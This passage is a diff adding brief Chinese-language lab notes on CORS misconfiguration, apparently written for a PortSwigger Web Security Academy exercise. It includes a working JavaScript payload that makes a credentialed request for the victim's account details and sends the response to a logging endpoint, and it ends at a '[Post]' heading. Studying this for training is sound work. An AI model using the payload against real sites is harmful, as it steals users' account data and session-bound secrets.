@@ -1,0 +1,17 @@
+当看到response有类似这个的时候，就要考虑是否有CORS问题了。同样，可以用burp scanner扫描出来。
+Access-Control-Allow-Credentials: true
+
+常见的利用方式: [Get]
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
+
+[Post]
